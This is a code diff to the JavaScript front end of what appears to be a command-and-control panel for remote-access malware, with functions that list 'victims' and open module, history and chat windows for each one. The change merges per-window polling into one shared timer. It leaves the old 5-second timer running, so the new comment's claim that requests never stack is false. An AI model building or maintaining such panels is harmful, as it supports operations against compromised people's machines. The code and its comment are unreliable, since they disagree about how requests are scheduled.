@@ -170,7 +170,10 @@ async function tick() {
       showLogin(false);
       state.victims = data.victims;
       render();
-      for (const win of state.windows.values()) if (win.poll) win.poll();
+      // Only windows still on screen: the map keeps closed ones, and every
+      // refresh is a full history round trip.
+      for (const win of state.windows.values())
+        if (win.poll && win.el.classList.contains("show")) win.poll();
     }
   } catch (e) {
     /* auth handled upstream */
@@ -456,10 +459,6 @@ function openModule(victim, verb, label) {
   };
   win.poll = poll;
   poll();
-  const timer = setInterval(() => {
-    if (!win.el.classList.contains("show")) return clearInterval(timer);
-    poll();
-  }, 2500);
 }
 
 function openHistory(victim) {
@@ -529,6 +528,22 @@ function openChat(victim) {
 }
 
 // -------------------------------------------------------------------- boot --
+// One beat for the whole panel. Every module window used to own a 2.5 s interval
+// that refetched the full history, so five open windows meant five requests per
+// beat, the tab never went idle and the cursor sat in the loading state the whole
+// session. Now a single beat refreshes the grid plus the windows actually on
+// screen, skips a hidden tab, and never stacks a request on one still in flight.
 showLogin(true);
-tick();
+let beatBusy = false;
+async function beat() {
+  if (beatBusy || document.hidden) return;
+  beatBusy = true;
+  try {
+    await tick();
+  } finally {
+    beatBusy = false;
+  }
+}
+beat();
+setInterval(beat, 3000);
 state.timer = setInterval(tick, 5000);
